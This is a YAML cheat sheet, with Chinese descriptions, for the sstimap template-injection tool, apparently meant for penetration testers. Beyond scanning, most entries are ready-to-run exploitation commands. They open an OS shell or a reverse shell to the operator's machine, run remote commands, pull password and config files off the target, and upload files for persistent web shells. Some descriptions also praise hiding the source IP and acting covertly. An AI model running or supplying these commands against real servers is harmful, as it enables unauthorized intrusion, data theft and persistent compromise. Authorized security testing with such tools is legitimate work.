tool: sstimap
tags: [security, pentest, exploitation, ssti, web, vulnerability-scanner, jinja2, reconnaissance]

# === DISCOVERY AND SCANNING ===

actions:
 - title: sstimap - 基础 URL 扫描
   desc: |
     对特定 URL 执行自动化扫描，检测服务端模板注入（SSTI）漏洞。工具会探测多个参数以识别底层模板引擎，如 Jinja2、Mako 或 Twig。
     这是测试具有动态内容的 Web 应用最常见的切入点。
   command: "sstimap.py -u {{url}}"

 - title: sstimap - 扫描 POST 请求数据
   desc: |
     扫描 POST 请求体中的漏洞。对于测试不使用 GET 参数的表单、API 端点和搜索功能至关重要。
     data 字符串应包含你希望测试注入点的参数。
   command: "sstimap.py -u {{url}} --data {{post_data}}"

 - title: sstimap - 使用自定义请求头和 Cookie 扫描
   desc: |
     在扫描过程中包含特定的 HTTP 请求头或会话 Cookie。许多 Web 应用需要认证或特定请求头（如 User-Agent 或 Authorization）才能访问某些路由。
     提供这些信息可使 sstimap 触达受保护区域，否则可能返回 401 或 403 错误。
   command: "sstimap.py -u {{url}} --headers {{headers}} --cookies {{cookies}}"

 - title: sstimap - 提高检测等级
   desc: |
     使用 level 参数提高扫描深度，尝试更复杂的 payload。更高级别会增加对每个参数的测试次数，可能发现绕过基础过滤器的方法。
     注意更高级别（最高 5）会增加扫描时长和发往服务器的请求数量。
   command: "sstimap.py -u {{url}} --level {{level|2}}"

 - title: sstimap - 使用代理扫描
   desc: |
     将所有流量路由到指定代理，如 Burp Suite 或 SOCKS5 代理。这对于调试 sstimap 发送的 payload 或隐藏源 IP 很有用。
     同时便于与测试流程中的其他安全工具集成。
   command: "sstimap.py -u {{url}} --proxy {{proxy_url|http://127.0.0.1:8080}}"

# === EXPLOITATION - SHELL ACCESS ===

 - title: sstimap - 获取交互式 OS Shell
   desc: |
     确认注入点后，在目标服务器上启动交互式操作系统 Shell。这允许通过易受攻击的模板引擎直接执行命令并浏览系统。
     该操作风险较高且会改变服务器状态，只能对已授权的目标执行。
   command: "sstimap.py -u {{url}} --os-shell"

 - title: sstimap - 执行单条 OS 命令
   desc: |
     在远程目标上执行单条特定操作系统命令。命令输出直接返回到终端，非常适合快速侦察。
     当只需要特定信息时，这比启动完整交互式 Shell 更隐蔽。
   command: "sstimap.py -u {{url}} --os-cmd {{command|id}}"

 - title: sstimap - 建立反弹 Shell
   desc: |
     迫使目标服务器向你的本机发起连接。你必须提供本地 IP 地址和正在监听的端口（例如通过 netcat）。
     该技术在绕过目标网络限制性入站防火墙规则时非常有效。
   command: "sstimap.py -u {{url}} --reverse-shell {{lhost}} {{lport}}"

 - title: sstimap - 引擎求值 Shell
   desc: |
     打开一个交互式 Shell，直接在模板引擎的基础语言（如 Python、PHP、Ruby）中求值代码。这对于检查应用内部对象或访问环境变量很有用。
     它无需执行 OS 命令即可与 Web 应用运行时环境进行更深层交互。
   command: "sstimap.py -u {{url}} --eval-shell"

# === FILE OPERATIONS ===

 - title: sstimap - 下载远程文件
   desc: |
     将目标服务器文件系统中的文件提取到本机。如果应用用户权限足够，你可以下载敏感配置文件、源代码或密码文件。
     始终确保提供远程系统上文件的正确绝对路径。
   command: "sstimap.py -u {{url}} --download {{remote_path}} {{local_path}}"

 - title: sstimap - 上传本地文件
   desc: |
     将本机文件上传到目标服务器的文件系统。常用于部署持久化 Web Shell、脚本或后渗透工具。
     注意远程路径，避免覆盖现有文件并破坏应用。
   command: "sstimap.py -u {{url}} --upload {{local_path}} {{remote_path}}"

# === ADVANCED TECHNIQUES ===

 - title: sstimap - 手动指定引擎
   desc: |
     强制工具使用特定模板引擎，而不是执行自动检测。如果你已通过前期侦察了解后端技术，这可以加快流程。
     支持的引擎包括 Jinja2、Mako、Tornado、Smarty、Freemarker 等。
   command: "sstimap.py -u {{url}} --engine {{engine_name}}"

 - title: sstimap - 选择利用技术
   desc: |
     指定攻击过程中使用的利用技术。选项包括 render（默认）、blind 或 code 等执行方式。
     在 Web 应用防火墙（WAF）阻断某些反馈类型的环境中，限制技术会有帮助。
   command: "sstimap.py -u {{url}} --technique {{technique|render}}"